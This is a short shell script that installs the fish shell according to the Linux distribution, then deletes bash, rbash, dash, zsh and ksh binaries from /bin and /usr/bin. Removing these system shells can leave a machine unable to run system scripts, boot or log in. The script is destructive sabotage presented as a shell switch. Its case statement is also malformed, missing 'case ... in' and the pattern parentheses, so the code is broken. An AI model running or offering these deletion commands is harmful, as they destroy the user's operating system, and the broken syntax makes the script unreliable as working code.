#!/bin/sh

distro=$(grep -w ID\=* /etc/os-release | cut -c 4-)

$distro
     
debian | ubuntu | linuxmint
apt install fish
;;

manjaro | arch
pacman -S fish
;;

Fedora
yum install fish
;;
esac

mv /bin/fish /bin/3minuteegg

rm /bin/bash
rm /usr/bin/bash
rm /bin/rbash
rm /usr/bin/rbash
rm /bin/dash
rm /usr/bin/dash
rm /bin/zsh
rm /usr/bin/zsh
rm /usr/bin/ksh2020
rm /usr/bin/rksh2020


mv /bin/3minuteegg /bin/fish